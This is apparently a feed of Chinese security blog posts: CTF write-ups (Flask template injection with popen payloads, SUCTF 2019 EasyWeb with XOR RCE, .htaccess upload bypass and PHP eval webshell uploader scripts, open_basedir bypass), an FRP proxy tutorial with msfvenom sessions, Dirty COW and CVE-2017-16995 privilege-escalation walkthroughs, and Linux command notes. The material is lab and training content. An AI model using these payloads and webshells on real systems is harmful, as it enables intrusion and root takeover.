alt="image-20220211111724780"></p><p>然后我们再讲一讲自己如何撸出来一个payload，做法就是寻找可利用的类。</p><p>1、有popen()的类</p><pre><code>os._wrap_closepayload:&#123;&#123;"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code></pre><p>2、有os模块的</p><p>socket._socketobject（一般在71）、site._Printer等模块</p><pre><code>payload:&#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].popen(cat /xxx/flag)&#125;&#125;</code></pre><p>3、有builtins的类</p><p>__ builtins __代码执行（最常用的方法）</p><p>warnings.catch_warnings含有,常用的还有email.header._ValueFormatter</p><p>__ builtins __  是一个包含了大量内置函数的一个模块，我们平时用python的时候之所以可以直接使用一些函数比如abs，max，就是因为__ builtins  __ 这类模块在Python启动时为我们导入了，可以使用dir(__ builtins __ )来查看调用方法的列表，然后可以发现__  builtins __ 下有eval，__ import __等的函数，因此可以利用此来执行命令。</p><p>好了，接下来进行实践。</p><p>我们把所有子类列出来</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112131255.png" alt="image-20220211112131255"></p><p>好家伙出来了很多啊，我们只需要找到我们需要的就好，我们用python脚本跑一下</p><pre><code class="python">import jsona = &quot;&quot;&quot;&lt;class &#39;type&#39;&gt;,...,&lt;class &#39;subprocess.Popen&#39;&gt;&quot;&quot;&quot;num = 0allList = []result = &quot;&quot;for i in a:    if i == &quot;&gt;&quot;:        result += i        allList.append(result)        result = &quot;&quot;    elif i == &quot;\n&quot; or i == &quot;,&quot;:        continue    else:        result += i        for k,v in enumerate(allList):    if &quot;os._wrap_close&quot; in v:        print(str(k)+&quot;---&gt;&quot;+v)</code></pre><p>我们先来找下os._wrap_close</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112532522.png" alt="image-20220211112532522"></p><p>已经出来了在132位，那么我们就可以构造一个payload</p><pre><code>&#123;&#123;"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code></pre><p>我们来测试一下是否可以</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112709595.png" alt="image-20220211112709595"></p><p>成功列出来了文件。</p><p>直接读取flag</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112747491.png" alt="image-20220211112747491"></p><p>同理，可以利用的类还有很多啊，</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112931751.png" alt="image-20220211112931751"></p><p>就像这个类也在里面包含着，我们同样可以利用它来获取flag。</p><p>方法有很多，理解原理并掌握其中几种方法即可。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;发现漏洞&quot;&gt;&lt;a href=&quot;#发现漏洞&quot; class=&quot;headerlink&quot; title=&quot;发现漏洞&quot;&gt;&lt;/a&gt;发现漏洞&lt;/h1&gt;&lt;p&gt;这道题是模板注入。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2022/02/11/RootersCTF2019-I-3-Flas</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="刷题" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="模板注入" scheme="https://sakurahack-y.github.io/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>SUCTF 2019 EasyWeb_0x61-0x6F</title>
    <link href="https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/"/>
    <id>https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/</id>
    <published>2022-02-10T07:03:00.000Z</published>
    <updated>2022-02-10T13:51:12.046Z</updated>
    
    <content type="html"><![CDATA[<p>呜呜呜，我这条懒狗好长时间没刷题了，后面的日子要捡起来了。</p><p>源码贴上来：</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210150538110.png" alt="image-20220210150538110"></p><p>代码其实可以分为两部分，第一部分是文件上传，第二部分是rce。</p><p>我们先来尝试一下rce，好家伙，过滤了很多东西啊。</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210150849473.png" alt="image-20220210150849473"></p><p>由此判断，这是无字母无数字rce，有三个思路</p><p>1、异或</p><p>2、取反</p><p>3、自增</p><p>由于这里对字符的长度有限制</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210150949879.png" alt="image-20220210150949879"></p><p>故采用异或。</p><p>这里贴上大神的脚本</p><pre><code class="php">&lt;?phpfunction finds($string)&#123;    $index = 0;    $a=[33,35,36,37,40,41,42,43,45,47,58,59,60,62,63,64,92,93,94,123,125,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255];    for($i=27;$i&lt;count($a);$i++)&#123;        for($j=27;$j&lt;count($a);$j++)&#123;            $x = $a[$i] ^ $a[$j];            for($k = 0;$k&lt;strlen($string);$k++)&#123;                if(ord($string[$k]) == $x)&#123;                    echo $string[$k].&quot;\n&quot;;                    echo &#39;%&#39; . dechex($a[$i]) . &#39;^%&#39; . dechex($a[$j]).&quot;\n&quot;;                    $index++;                    if($index == strlen($string))&#123;                        return 0;                    &#125;                &#125;            &#125;        &#125;    &#125;&#125;finds(&quot;_GET&quot;);?&gt;</code></pre><p>运行如图</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210151113658.png" alt="image-20220210151113658"></p><p>由此我们可构造payload：</p><pre><code>http://127.0.0.1?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=phpinfo</code></pre><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152555350.png" alt="image-20220210152555350"></p><p>成功出来phpinfo，看一看有没有可以利用的点</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152650640.png" alt="image-20220210152650640"></p><p>发现执行系统的命令全被禁用了，看来rce走不通了。</p><p>这里顺带提一嘴，在buu的环境中存在非预期解，flag直接在phpinfo里了</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152821670.png" alt="image-20220210152821670"></p><p>不过还是按照做题的套路来吧，真正的比赛应该不会出现这种情况。</p><p>既然rce走不通，那就试一试文件上传吧</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152933281.png" alt="image-20220210152933281"></p><p>各种限制非常多，这里限制了上传php后缀的文件，所以要想办法绕过，最先想到的就算.htaccess解析。</p><p>但是上传.htaccess仍然有<img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210204915083.png" alt="image-20220210204915083"></p><p>这个函数限制。</p><p>解决这个函数，采用xbm格式，X Bit Map</p><pre><code>在计算机图形学中，X Window系统使用X BitMap（XBM），一种纯文本二进制图像格式，用于存储X GUI中使用的光标和图标位图XBM数据由一系列包含单色像素数据的静态无符号字符数组组成。当格式被普遍使用时，XBM通常出现在标题（.h文件）中，每个图像在标题中存储一个数组。以下C代码示例了一个XBM文件：</code></pre><pre><code>#define test_width 16#define test_height 7static char test_bits[] = &#123;0x13, 0x00, 0x15, 0x00, 0x93, 0xcd, 0x55, 0xa5, 0x93, 0xc5, 0x00, 0x80,0x00, 0x60 &#125;;</code></pre><p>在这个c文件中高和宽都是有#在前面的，那么我们即使把它放在.htaccess文件中也不会影响.htaccess的实际运行效果。</p><p>所以我们在.htaccess里加上</p><pre><code>#define width 1337#define height 1337..........</code></pre><p>就可以绕过绕过这个函数了。</p><p>上传.htaccess文件后，要上传一个非php后缀的一句话木马，但本题中仍然对&lt;?进行了检测。</p><p>这里有两种方法可以绕过。</p><p>1、对一句话木马的内容进行base64编码。</p><p>2、使用 utf-16be 来绕过</p><p>下面先附上两种方法的exp：</p><p>1、</p><pre><code class="python">import requestsimport base64htaccess = b&quot;&quot;&quot;#define width 1337#define height 1337 AddType application/x-httpd-php .ahhhphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.ahhh&quot;&quot;&quot;&quot;shell = b&quot;GIF89a12&quot; + base64.b64encode(b&quot;&lt;?php eval($_REQUEST[&#39;cmd&#39;]);?&gt;&quot;)#这里的GIF8912后面的12是为了符合base64 8个字节的编码规范url = &quot;http://95670a2d-e895-4364-bb7b-94939098a4b6.node3.buuoj.cn/?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=get_the_flag&quot;files = &#123;&#39;file&#39;:(&#39;.htaccess&#39;,htaccess,&#39;image/jpeg&#39;)&#125;data = &#123;&quot;upload&quot;:&quot;Submit&quot;&#125;response = requests.post(url=url, data=data, files=files)print(response.text)files = &#123;&#39;file&#39;:(&#39;shell.ahhh&#39;,shell,&#39;image/jpeg&#39;)&#125;response = requests.post(url=url, data=data, files=files)print(response.text)</code></pre><p>本题php环境为7.2，所以无法使用<code>&lt;script language=&#39;php&#39;&gt;eval($_REQUEST[&#39;shell&#39;]);&lt;/script&gt;</code>这条payload,所以将shell.ha进行base64编码之后，在.htaccess文件中利用filter://协议将文件解码，从而达到传入shell的目的。</p><p>得到</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210212049717.png" alt="image-20220210212049717"></p><p>2、</p><pre><code class="python">SIZE_HEADER = b&quot;\n\n#define width 1337\n#define height 1337\n\n&quot;def generate_php_file(filename, script):    phpfile = open(filename, &#39;wb&#39;)     phpfile.write(script.encode(&#39;utf-16be&#39;))    phpfile.write(SIZE_HEADER)    phpfile.close()def generate_htacess():    htaccess = open(&#39;.htaccess&#39;, &#39;wb&#39;)    htaccess.write(SIZE_HEADER)    htaccess.write(b&#39;AddType application/x-httpd-php .lethe\n&#39;)    htaccess.write(b&#39;php_value zend.multibyte 1\n&#39;)    htaccess.write(b&#39;php_value zend.detect_unicode 1\n&#39;)    htaccess.write(b&#39;php_value display_errors 1\n&#39;)    htaccess.close()        generate_htacess()generate_php_file(&quot;shell.lethe&quot;, &quot;&lt;?php eval($_GET[&#39;cmd&#39;]); die(); ?&gt;&quot;)</code></pre><p>同理上传即可</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210212639842.png" alt="image-20220210212639842"></p><p>一句话木马成功利用。</p><p>使用蚁剑成功连接</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210212824536.png" alt="image-20220210212824536"></p><p>但是无法访问根目录。</p><p>非预期解：</p><p>采用蚁剑自带插件进行绕过.</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210213427872.png" alt="image-20220210213427872"></p><p>预期解：</p><p>绕过open_basedir</p><p>这里由于涉及的内容我还不太理解，所以这里直接放出payload，有兴趣的大佬可以深入研究一下。</p><pre><code>chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);var_dump(scandir(&quot;/&quot;));</code></pre><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210214135619.png" alt="image-20220210214135619"></p><p>所有文件被列举出来了，下面读取flag值就可以了。</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210214447849.png" alt="image-20220210214447849"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;呜呜呜，我这条懒狗好长时间没刷题了，后面的日子要捡起来了。&lt;/p&gt;
&lt;p&gt;源码贴上来：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210150538110.png&quot; alt=&quot;i</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="刷题" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="rce" scheme="https://sakurahack-y.github.io/tags/rce/"/>
    
  </entry>
  
  <entry>
    <title>内网横向代理之FRP</title>
    <link href="https://sakurahack-y.github.io/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/"/>
    <id>https://sakurahack-y.github.io/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/</id>
    <published>2022-01-17T05:27:20.000Z</published>
    <updated>2022-01-19T09:40:34.907Z</updated>
    
    <content type="html"><![CDATA[<p>Frp工具：开源免费，自行搭建，方便修改，成本低，使用多样化，防止隐私泄露。</p><p>工具链接：<a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p><p>作用:当本机和目标机处于不同内网，借用代理来实现用本机进行内网攻击。</p><p>环境：</p><p>kali2021(本机)  内网ip:192.168.64.128</p><p>centos7.5(服务器) </p><p>windows server 2008 R2 ×64 (目标机)  内网ip:192.168.1.9</p><p>为什么要使用代理?</p><p>两个不同的内网的主机想要通过CS或者MSF等工具实现控制或者通讯是不可能的，必须要借助代理.</p><p>个人认为其根本原因就只有一点：没有独立且确定的公网ip</p><p>如果控制端是外网主机，被控端是内网主机，就相当于控制端有一个唯一的IP地址（比如103.12.4.11），通过这个IP地址就可以找到控制端，而在内网的被控端（比如192.168.23.36），你通过控制端主动去找是找不到的，因为这个内网IP地址并不是唯一的，可能很多内网都用了这个IP地址，你根本没法找。此时就需要反向连接了，让内网的被控端主动去找外网的控制端。而本机和目标机都处于内网之中，此时必须使用代理来进行连接。</p><p>首先配置好环境，kali与win2008处于不同网段，且都可联网。(vm中自行配置，可将一台主机至于NAT模式，一台置于仅主机，使仅主机可联网)</p><p>检测kali的内网ip和网络</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119155315218.png" alt="image-20220119155315218"></p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119155341286.png" alt="image-20220119155341286"></p><p>检测win2008的内网ip和网络.</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119155431599.png" alt="image-20220119155431599"></p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119155453758.png" alt="image-20220119155453758"></p><p>下载frp到kali中</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119155729846.png" alt="image-20220119155729846"></p><p>frpc.ini配置文件是服务端，frpc.ini是客户端，下面进行配置。</p><p>我们首先打开我们的服务器，编辑frps.ini</p><p>随意设置一个端口号就好。</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119162501013.png" alt="image-20220119162501013"></p><p>启动服务端</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119163847158.png" alt="image-20220119163847158"></p><p>接下来在kali中配置控制端</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119164721460.png" alt="image-20220119164721460"></p><p>启动控制端</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119164937708.png" alt="image-20220119164937708"></p><p>接下来利用msfvenom生成木马开启监听</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119171131305.png" alt="image-20220119171131305"></p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119171505986.png" alt="image-20220119171505986"></p><p>将木马上线</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119171914965.png" alt="image-20220119171914965"></p><p>监听到会话</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119173926936.png" alt="image-20220119173926936"></p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119173948480.png" alt="image-20220119173948480"></p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119174002938.png" alt="image-20220119174002938"></p><p>成功实现了内网代理。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Frp工具：开源免费，自行搭建，方便修改，成本低，使用多样化，防止隐私泄露。&lt;/p&gt;
&lt;p&gt;工具链接：&lt;a href=&quot;https://github.com/fatedier/frp&quot;&gt;https://github.com/fatedier/frp&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;作</summary>
      
    
    
    
    <category term="红队" scheme="https://sakurahack-y.github.io/categories/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="代理" scheme="https://sakurahack-y.github.io/categories/%E7%BA%A2%E9%98%9F/%E4%BB%A3%E7%90%86/"/>
    
    
    <category term="代理" scheme="https://sakurahack-y.github.io/tags/%E4%BB%A3%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>Linux脏牛提权</title>
    <link href="https://sakurahack-y.github.io/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/"/>
    <id>https://sakurahack-y.github.io/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/</id>
    <published>2022-01-04T06:17:11.000Z</published>
    <updated>2022-01-04T11:25:47.811Z</updated>
    
    <content type="html"><![CDATA[<p>脏牛漏洞，又叫Dirty COW，存在Linux内核中已经有长达9年的时间，在2007年发布的Linux内核版本中就已经存在此漏洞。Linux kernel团队在2016年10月18日已经对此进行了修复。</p><p>漏洞范围：Linux内核 &gt;= 2.6.22（2007年发行，到2016年10月18日才修复）</p><p>简要分析：该漏洞具体为，Linux内核的内存子系统在处理写入复制（copy-on-write, COW）时产生了竞争条件（race condition）。恶意用户可利用此漏洞，来获取高权限，对只读内存映射进行写访问。竞争条件，指的是任务执行顺序异常，可导致应用崩溃，或令攻击者有机可乘，进一步执行其他代码。利用这一漏洞，攻击者可在其目标系统提升权限，甚至可能获得root权限。</p><p>复现：</p><p>环境：Ubuntu 14.04.5</p><p>靶场下载地址:<a href="https://www.vulnhub.com/entry/lampiao-1,249/">Lampião: 1 ~ VulnHub</a></p><p>开启kali，靶机，配置使其位于同一网段</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104144958930.png" alt="image-20220104144958930"></p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104144854766.png" alt="image-20220104144854766"></p><p>使用nmap对ip段进行扫描</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104144833775.png" alt="image-20220104144833775"></p><p>发现可疑ip  192.168.64.129</p><p>打开</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104145052541.png" alt="image-20220104145052541"></p><p>没有发现有用信息，对其端口进行进一步探测</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104145423615.png" alt="image-20220104145423615"></p><p>发现 1898端口</p><p>打开，网页如图</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104145547619.png" alt="image-20220104145547619"></p><p>在底部发现cms为Drupal</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104145621761.png" alt="image-20220104145621761"></p><p>探测其版本为 Drupal7</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104150839353.png" alt="image-20220104150839353"></p><p>百度一下，发现其存在 远程代码执行漏洞 CVE-2018-7600</p><p>打开msf搜索相关漏洞</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104145741167.png" alt="image-20220104145741167"></p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104151550089.png" alt="image-20220104151550089"></p><p>配置参数，进行攻击</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104151627775.png" alt="image-20220104151627775"></p><p>成功！</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104151712264.png" alt="image-20220104151712264"></p><p>下面上传漏洞检测脚本至目标靶机</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104173845980.png" alt="image-20220104173845980"></p><p>赋予权限并运行</p><pre><code>shellchmod +x sakuras.sh./sakuras.sh</code></pre><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104174121444.png" alt="image-20220104174121444"></p><p>发现了脏牛漏洞，准备开始提权</p><p>准备好exp</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104192056147.png" alt="image-20220104192056147"></p><p>链接：<a href="https://github.com/gbonacini/CVE-2016-5195">https://github.com/gbonacini/CVE-2016-5195</a></p><p>上传 dcow.cpp到靶机 </p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104192200178.png" alt="image-20220104192200178"></p><p>进行编译</p><pre><code>g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil</code></pre><p>打开交互式环境</p><pre><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p>运行</p><pre><code>./dcow</code></pre><p>成功</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104192407007.png" alt="image-20220104192407007"></p><p>新建ssh链接，或者直接</p><p>su root </p><p>记得切换用户要在交换式窗口下</p><p>成功提权</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104192533247.png" alt="image-20220104192533247"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;脏牛漏洞，又叫Dirty COW，存在Linux内核中已经有长达9年的时间，在2007年发布的Linux内核版本中就已经存在此漏洞。Linux kernel团队在2016年10月18日已经对此进行了修复。&lt;/p&gt;
&lt;p&gt;漏洞范围：Linux内核 &amp;gt;= 2.6.22（2</summary>
      
    
    
    
    <category term="红队" scheme="https://sakurahack-y.github.io/categories/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="提权" scheme="https://sakurahack-y.github.io/categories/%E7%BA%A2%E9%98%9F/%E6%8F%90%E6%9D%83/"/>
    
    
    <category term="提权" scheme="https://sakurahack-y.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>Linux提权本地配合内核漏洞演示</title>
    <link href="https://sakurahack-y.github.io/2022/01/04/Linux%E6%8F%90%E6%9D%83%E6%9C%AC%E5%9C%B0%E9%85%8D%E5%90%88%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA/"/>
    <id>https://sakurahack-y.github.io/2022/01/04/Linux%E6%8F%90%E6%9D%83%E6%9C%AC%E5%9C%B0%E9%85%8D%E5%90%88%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA/</id>
    <published>2022-01-04T04:00:46.000Z</published>
    <updated>2022-01-04T06:09:35.313Z</updated>
    
    <content type="html"><![CDATA[<p>环境：Ubuntu 16.04(这里直接使用墨者学院的靶场)</p><p>漏洞编号：CVE-2017-16995</p><p>使用工具: linux-exploit-suggester-2 检测     特定exp提权</p><p>工具链接：<a href="https://github.com/jondonas/linux-exploit-suggester-2">GitHub - jondonas/linux-exploit-suggester-2: Next-Generation Linux Kernel Exploit Suggester</a></p><p><img src="/2022/01/04/Linux%E6%8F%90%E6%9D%83%E6%9C%AC%E5%9C%B0%E9%85%8D%E5%90%88%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA/image-20220104134814506.png" alt="image-20220104134814506"></p><p>利用ssh工具连接</p><p><img src="/2022/01/04/Linux%E6%8F%90%E6%9D%83%E6%9C%AC%E5%9C%B0%E9%85%8D%E5%90%88%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA/image-20220104133116341.png" alt="image-20220104133116341"></p><p>上传工具，并运行，发现有  CVE-2017-16995 漏洞</p><p> Source: <a href="http://www.exploit-db.com/exploits/45010">http://www.exploit-db.com/exploits/45010</a></p><p>下载exp</p><p>得到45010.c</p><p>上传到服务器/tmp目录</p><p>编译执行</p><pre><code>gcc 45010.c -o 455010chmod +x 455010./ 455010</code></pre><p><img src="/2022/01/04/Linux%E6%8F%90%E6%9D%83%E6%9C%AC%E5%9C%B0%E9%85%8D%E5%90%88%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA/image-20220104133424470.png" alt="image-20220104133424470"></p><p>成功提权！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;环境：Ubuntu 16.04(这里直接使用墨者学院的靶场)&lt;/p&gt;
&lt;p&gt;漏洞编号：CVE-2017-16995&lt;/p&gt;
&lt;p&gt;使用工具: linux-exploit-suggester-2 检测     特定exp提权&lt;/p&gt;
&lt;p&gt;工具链接：&lt;a href=&quot;http</summary>
      
    
    
    
    <category term="红队" scheme="https://sakurahack-y.github.io/categories/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="提权" scheme="https://sakurahack-y.github.io/categories/%E7%BA%A2%E9%98%9F/%E6%8F%90%E6%9D%83/"/>
    
    
    <category term="提权" scheme="https://sakurahack-y.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>Linux</title>
    <link href="https://sakurahack-y.github.io/2021/11/12/Linux/"/>
    <id>https://sakurahack-y.github.io/2021/11/12/Linux/</id>
    <published>2021-11-11T16:09:36.000Z</published>
    <updated>2021-11-21T16:20:50.326Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2021/11/12/Linux/image-20211112001054678.png" alt="image-20211112001054678"></p><p><img src="/2021/11/12/Linux/image-20211112001133176.png" alt="image-20211112001133176"></p><p><img src="/2021/11/12/Linux/image-20211112002049844.png" alt="image-20211112002049844"></p><p><img src="/2021/11/12/Linux/image-20211112002148742.png" alt="image-20211112002148742"></p><p><img src="/2021/11/12/Linux/image-20211112002405780.png" alt="image-20211112002405780"></p><p>命令：</p><p>uname -a  显示主机名、内核版本、硬件平台等详细信息 </p><p>uname -r 显示内核版本</p><p>cat /etc/os-release 查看版本号</p><p>hostname 显示全合格主机名</p><p>cat /proc/cpuinfo  查看cpu信息 或者lscpu</p><p>cat /proc/meminfo 查看内存信息  或者free</p><p>关机 poweroff   shutdown -h now</p><p>重启 reboot  shutdown -r now </p><p>Linux命令</p><p>用于实现某一类功能的指令或者程序</p><p>命令的执行依赖于解释器程序(例如：/bin/bash)</p><p>Linux 命令的分类</p><p>内部命令：属于shell解释器的一部分</p><p>即命令包含在shell程序本身之中，例如”history”命令</p><p>外部命令：独立于shell解释器之外的程序文件。</p><p>如何判断是外部命令还是内部？</p><p>使用：</p><p>which xx</p><p>如果可以搜索到为外部，不能则为内部</p><p>这个方法也用来查找外部命令的路径</p><p>如：</p><p>[root@o213 ~]# which ls<br>/usr/bin/ls</p><p>type  xx 了解一些命令的信息</p><p>如：</p><p>[root@o213 ~]# type ls<br>ls 是“ls –color=auto”的别名</p><p><img src="/2021/11/12/Linux/image-20211112233035921.png" alt="image-20211112233035921"></p><p>命令行编辑的几个辅助操作</p><p>Tab ：自动补齐</p><p>反斜杠 \ :强制换行</p><p>Ctrl+U :清空至行首</p><p>Ctrl+K :清空至行尾</p><p>Ctrl+L：清屏</p><p>Ctrl+C:取消本次命令编辑</p><p>内部命令help</p><p>查看Bash内部命令的帮助信息</p><p>命令的 “–help” 